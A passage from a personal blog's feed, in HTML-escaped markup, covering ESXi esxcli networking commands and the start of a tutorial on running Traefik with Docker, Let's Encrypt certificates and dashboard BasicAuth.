+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esxcli network ip netstack add -N New_Stack
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;port-group&quot;&gt;Port Group&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;List port groups&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# esxcli network vswitch standard portgroup list
+
+Name           Virtual Switch  Active Clients  VLAN ID
+-------------  --------------  --------------  -------
+Management     vSwitch0                     1        0
+VM network     vSwitchLAN                   1        0
+WAN network    vSwitch0                     1       98
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Add a new port group (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remove&lt;/code&gt; - the same)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esxcli network vswitch standard portgroup add -p New_Management -v vSwitch_New
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;network-interface-vmk-nic&quot;&gt;Network Interface (vmk nic)&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;List VMkernel interfaces&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# esxcli network ip interface list
+
+vmk0
+   Name: vmk0
+   MAC Address: 00:50:56:6c:01:11
+   Enabled: true
+   Portset: vSwitch0
+   Portgroup: Management
+   Netstack Instance: defaultTcpipStack
+   VDS Name: N/A
+   VDS UUID: N/A
+   VDS Port: N/A
+   VDS Connection: -1
+   Opaque Network ID: N/A
+   Opaque Network Type: N/A
+   External ID: N/A
+   MTU: 1500
+   TSO MSS: 65535
+   RXDispQueue Size: 1
+   Port ID: 33554443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;List them IP settings&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# esxcli network ip interface ipv4 get
+
+Name  IPv4 Address  IPv4 Netmask   IPv4 Broadcast  Address Type  Gateway      DHCP DNS
+----  ------------  -------------  --------------  ------------  -----------  --------
+vmk0  192.168.1.11  255.255.255.0  192.168.1.255   STATIC        192.168.1.1     false
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Add a new vmkernel interface&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esxcli network ip interface add -i vmk2 -p New_Management -N New_Stack
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Configure the new vmkernel interface&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esxcli network ip interface ipv4 set -i vmk2 -I 172.16.1.111 -N 255.255.255.0 -t static -g 172.16.1.25
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Set default Gateway&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esxcfg-route -a default 172.16.1.25
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Mark &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vmk2&lt;/code&gt; for Management traffic&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esxcli network ip interface tag add -i vmk2 -t Management
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;search-domains-dns&quot;&gt;Search Domains (DNS)&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;List a DNS servers&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# esxcli network ip dns search list
+
+   DNSSearch Domains: 192.168.1.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Add a new DNS&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esxcli network ip dns search -d 8.8.8.8 -N New_Stack
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;network-troubleshooting-commands&quot;&gt;Network Troubleshooting commands&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vmkping&lt;/code&gt; is one of them. This command allows us to use the IP stack of VMkernel interface to send a ping command to another VMkernel interface. Like this you can check if the remote site (remote host) reply on this VMkernel.&lt;/p&gt;
+
+&lt;p&gt;Let’s describe our scenario. I’m connected via Putty to my esxi host on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.11&lt;/code&gt; and I’ll be pinging by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vmk0&lt;/code&gt; another host in LAN on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.22&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# vmkping -I vmk0 192.168.1.22
+
+PING 192.168.1.22 (192.168.1.22): 56 data bytes
+64 bytes from 192.168.1.22: icmp_seq=0 ttl=64 time=0.583 ms
+64 bytes from 192.168.1.22: icmp_seq=1 ttl=64 time=0.406 ms
+
+--- 192.168.1.22 ping statistics ---
+2 packets transmitted, 2 packets received, 0% packet loss
+round-trip min/avg/max = 0.406/0.494/0.583 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;Additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.vmgu.ru/news/vmware-esxi-50-esxcli&quot;&gt;Виртуализация - Некоторые полезные команды ESXCLI в VMware ESXi 5.0, чтобы побольше узнать о хосте и окружении&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://thevirtualist.org/remove-re-create-management-network-vmkernel-interface-using-esxi-command-line/&quot;&gt;Remove and Re-Create Management Network (vmk0) VMkernel interface using ESXi Command line&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://buildvirtual.net/utilize-vsphere-cli-commands-to-troubleshoot-esxi-network-configurations/&quot;&gt;Utilize vSphere CLI Commands to Troubleshoot ESXi Network Configurations&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.vladan.fr/esxi-commands-list-networking-commands/&quot;&gt;ESXi Commands List - networking commands&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="sysad" /><category term="esxi" /><category term="vm" /><category term="networks" /><summary type="html">This quick post about ESX CLI networking basics. Here is should be useful to recover the Management Network functionality on your ESXi host.</summary></entry><entry><title type="html">Docker. Create secure web service using Let’s Encrypt with Traefik</title><link href="https://gainanov.pro/eng-blog/devops/docker-web-service-with-traefik/" rel="alternate" type="text/html" title="Docker. Create secure web service using Let’s Encrypt with Traefik" /><published>2020-02-22T00:00:00+03:00</published><updated>2020-02-22T00:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/devops/docker-web-service-with-traefik</id><content type="html" xml:base="https://gainanov.pro/eng-blog/devops/docker-web-service-with-traefik/">&lt;p&gt;In my &lt;a href=&quot;/eng-blog/devops/docker-traefik-concept-terms-explanation/&quot;&gt;previous&lt;/a&gt; post I speak about &lt;a href=&quot;https://docs.traefik.io/&quot;&gt;Traefik&lt;/a&gt; concepts and designs. I explain the main words used in Traefik as Endpoint, Router, Rule and etc. So in here I will concentrate only on practice.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gainanov.pro/eng-blog/assets/images/traefik/treafik_docker.png&quot; class=&quot;align-center&quot;&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/traefik/treafik_docker.png&quot; alt=&quot;traefik-docker-scheme&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;what-well-do&quot;&gt;What We’ll Do&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;We’ll use a pre-made container — &lt;a href=&quot;https://github.com/containous/whoami&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;containous/whoami&lt;/code&gt;&lt;/a&gt; — capable of telling you where it is hosted and what it receives when you call it.&lt;/li&gt;
+  &lt;li&gt;We’ll deploy that container through traefik proxy using docker-compose.&lt;/li&gt;
+  &lt;li&gt;We’ll define a dashboard that shows us all deployed services.&lt;/li&gt;
+  &lt;li&gt;We’ll setup letsencrypt configures that will automatically get and update free SSL certificates.&lt;/li&gt;
+  &lt;li&gt;We’ll configure proxy to redirect all insecure requests to https scheme.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;prerequisite&quot;&gt;Prerequisite&lt;/h2&gt;
+&lt;p&gt;You have installed a Docker and docker-compose. We will use Traefik 2.1&lt;/p&gt;
+
+&lt;h2 id=&quot;repository&quot;&gt;Repository&lt;/h2&gt;
+&lt;p&gt;All presented compose files has stored in &lt;a href=&quot;https://github.com/GRomR1/docker-traefik&quot;&gt;this&lt;/a&gt; Github Repository.&lt;/p&gt;
+
+&lt;h2 id=&quot;1-use-traefik-as-proxy&quot;&gt;1. Use traefik as proxy&lt;/h2&gt;
+
+&lt;p&gt;This basic configuration will be a start point to run traefik with docker.&lt;/p&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3'&lt;/span&gt;
+
+&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;traefik&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik:v2.1&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Enable dashboard&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--api.dashboard=true&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Allow use API and dashboard though insecure&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--api.insecure=true&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Use docker as provider&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--providers.docker=true&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Enable log income requsts&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--accesslog=true&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Set log level (default ERROR)&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--log.level=ERROR&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Define entrypoint that listens 80 port&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--entryPoints.web.address=:80&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# The HTTP port&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;80:80&quot;&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# The Web UI (enabled by --api.insecure=true)&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;8080:8080&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Mount docker socker from host machine&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/var/run/docker.sock:/var/run/docker.sock:ro&lt;/span&gt;
+
+  &lt;span class=&quot;na&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# A container that exposes an API to show its IP address&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;containous/whoami&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;whoami&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Create a route `whoami` and bound with defined entrypoint&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.entrypoints=web&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Create rule&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.rule=Host(`whoami.example.com`)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We declare two services. First service is our traefik. Second one is a service response information about itself on web requests. Also we’ve enabled API along with the dashboard. And we can see it on &lt;a href=&quot;http://localhost:8080/dashboard&quot;&gt;localhost:8080/dashboard/&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;After we append a hostname &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami.example.com&lt;/code&gt; to local DNS (i.e. to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;) we can access to a created &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; container from browser by link &lt;a href=&quot;http://whoami.example.com&quot;&gt;http://whoami.example.com&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Without any changing DNS service we also could send request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; with curl:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# curl -H Host:whoami.example.com http://localhost
+
+Hostname: 3b64e9ee3e38
+IP: 127.0.0.1
+IP: 172.28.0.2
+RemoteAddr: 172.28.0.3:55870
+GET / HTTP/1.1
+Host: whoami.example.com
+User-Agent: curl/7.54.0
+Accept: */*
+Accept-Encoding: gzip
+X-Forwarded-For: 172.28.0.1
+X-Forwarded-Host: whoami.example.com
+X-Forwarded-Port: 80
+X-Forwarded-Proto: http
+X-Forwarded-Server: a9dfe96d5877
+X-Real-Ip: 172.28.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;2-https-with-lets-encrypt&quot;&gt;2. HTTPS with Let’s Encrypt&lt;/h2&gt;
+
+&lt;p&gt;Today almost all services are accessed by secure https connection. Installing an SSL certificate is the most common work.
+It also could be done with Traefik. Let’s create a compose file with next content:&lt;/p&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3'&lt;/span&gt;
+
+&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;traefik&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik:v2.1&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--api.dashboard=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--api.insecure=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--providers.docker=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--accesslog=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--entryPoints.web.address=:80&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--entryPoints.websecure.address=:443&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Enable ACME (Let's Encrypt): automatic SSL.&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.email=user@example.com&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# File or key used for certificates storage.&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.storage=/acme/acme.json&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Uncomment the line to use Let's Encrypt's staging server,&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.caServer=https://acme-staging-v02.api.letsencrypt.org/directory&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Use a TLS-ALPN-01 ACME challenge.&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# - --certificatesResolvers.letsencrypt.acme.tlsChallenge=true&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Use a HTTP-01 ACME challenge.&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.httpChallenge=true&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# EntryPoint to use for the HTTP-01 challenges.&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.httpChallenge.entryPoint=web&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# The HTTP port&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;80:80&quot;&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# The HTTPS port&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;443:443&quot;&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# The Web UI (enabled by --api.insecure=true)&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;8080:8080&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/var/run/docker.sock:/var/run/docker.sock&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# ACME certificates can be stored in a JSON file that needs to have a 600 file mode&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./acme:/acme&lt;/span&gt;
+
+  &lt;span class=&quot;na&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# A container that exposes an API to show its IP address&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;containous/whoami&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;whoami&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Handle secure and insecure traffic from websecure,web entry points&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.entrypoints=websecure,web&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Accept requests that matched specific Host&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.rule=Host(`whoami.example.com`)&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Enable TLS/SSL&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.tls=true&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Bind with created certresolver `letsencrypt`&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.tls.certresolver=letsencrypt&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A traefik service will call &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Let’s encrypt&lt;/a&gt; HTTP challenge to create a free SSL certificate.
+The server have to be explored from Internet by 80 port and specified DNS &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami.example.com&lt;/code&gt;.
+In this example to test purposes was setup a staging letsencrypt server. Comment the line with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acme.caServer&lt;/code&gt; to use production server by default. Also don’t forget to change a mail address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user@example.com&lt;/code&gt; to your.&lt;/p&gt;
+
+&lt;h2 id=&quot;3-add-basicauth-to-dashboard&quot;&gt;3. Add BasicAuth to Dashboard&lt;/h2&gt;
+
+&lt;p&gt;Once Traefik has found a match for the request, it can process it before forwarding it to the service.
+In the following example, we’ll add a &lt;a href=&quot;https://en.wikipedia.org/wiki/Basic_access_authentication&quot;&gt;BasicAuth&lt;/a&gt; mechanism for our route.
+This is done with a few additional labels on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;traefik&lt;/code&gt; service. After that you could open &lt;a href=&quot;https://docs.traefik.io/operations/dashboard/&quot;&gt;Dashboard&lt;/a&gt; by name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dashboard.example.com&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3'&lt;/span&gt;
+
+&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;traefik&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik:v2.1&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--api=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--api.dashboard=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--providers.docker=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--providers.docker.exposedbydefault=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--accesslog=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--entryPoints.web.address=:80&lt;/span&gt;
